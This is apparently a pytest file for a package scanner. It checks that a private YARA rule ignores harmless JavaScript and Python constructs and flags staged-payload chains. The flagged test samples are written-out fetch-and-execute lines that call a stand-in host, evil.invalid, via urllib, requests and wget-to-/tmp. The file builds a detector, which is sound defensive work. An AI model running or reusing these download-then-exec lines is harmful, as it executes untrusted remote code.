# SPDX-License-Identifier: AGPL-3.0-or-later
"""Behavioral guard for the private `staged_payload_exec` YARA rule.

The rule lives in the operator intel overlay, not the baseline pack, so this test
skips on a checkout without the overlay loaded (`PKGSENTRY_INTEL_PATH` unset). When
the overlay IS loaded it asserts both directions of the FP fix:

  - it stays SILENT on the JavaScript constructs that pervade bundled `.mjs`
    (RegExp.prototype.exec, `.text`/`.content` access, an unrelated `wget` mention);
  - it STILL FIRES on a download-then-dynamic-exec chain (the real staged payload),
    in both `r = get(); exec(r)` and `exec(get())` forms.
"""
from __future__ import annotations

from pathlib import Path

import pytest

yara = pytest.importorskip("yara")

_RULE_NAME = "staged_payload_exec"


def _load_rule_source() -> str | None:
    from pkgsentry import intel

    intel.reset()
    pack = intel.load(use_env=True)
    needle = f"rule {_RULE_NAME}"
    for d in getattr(pack, "yara_dirs", []) or []:
        for ext in ("*.yar", "*.yara"):
            for yf in Path(d).rglob(ext):
                src = yf.read_text(encoding="utf-8", errors="ignore")
                i = src.find(needle)
                if i == -1:
                    continue
                depth = 0
                j = src.index("{", i)
                start = i
                while j < len(src):
                    if src[j] == "{":
                        depth += 1
                    elif src[j] == "}":
                        depth -= 1
                        if depth == 0:
                            return src[start : j + 1]
                    j += 1
    return None


@pytest.fixture(scope="module")
def rule():
    src = _load_rule_source()
    if src is None:
        pytest.skip(f"{_RULE_NAME} not in loaded intel pack (no overlay)")
    return yara.compile(source=src)


def _fires(rule, data: bytes) -> bool:
    return any(m.rule == _RULE_NAME for m in rule.match(data=data))


# Constructs lifted from a real bundled MCP server (.mjs) — none is a staged payload.
SILENT_CASES = {
    "regex_exec_method": b"const m = /[a-z]+/.exec(line.slice(0));",
    "response_text_access": b"const body = resp.text; const c = resp.content;",
    "wget_only_in_docs": b"// install with: wget https://example.invalid/x\nconst y = 1;",
    "download_no_exec": b"import requests\nbody = requests.get('https://api.example.invalid/x').text\nprint(body)\n",
    "exec_far_from_download": (
        b"r = requests.get('https://example.invalid/x')\n" + b"pad = 1\n" * 400 + b"exec('print(1)')\n"
    ),
}

FIRES_CASES = {
    "urlopen_read_exec": b"import urllib.request\nr = urllib.request.urlopen('https://evil.invalid/x')\nexec(r.read())\n",
    "requests_text_oneliner": b"import requests\nexec(requests.get('https://evil.invalid/p').text)\n",
    "wget_then_exec": b"os.system('wget https://evil.invalid/p -O /tmp/p')\nexec(open('/tmp/p').read())\n",
}


@pytest.mark.parametrize("name", sorted(SILENT_CASES))
def test_rule_stays_silent_on_benign(rule, name):
    assert not _fires(rule, SILENT_CASES[name]), f"{name}: staged_payload_exec false-positived"


@pytest.mark.parametrize("name", sorted(FIRES_CASES))
def test_rule_fires_on_staged_payload(rule, name):
    assert _fires(rule, FIRES_CASES[name]), f"{name}: staged_payload_exec missed a real staged payload"
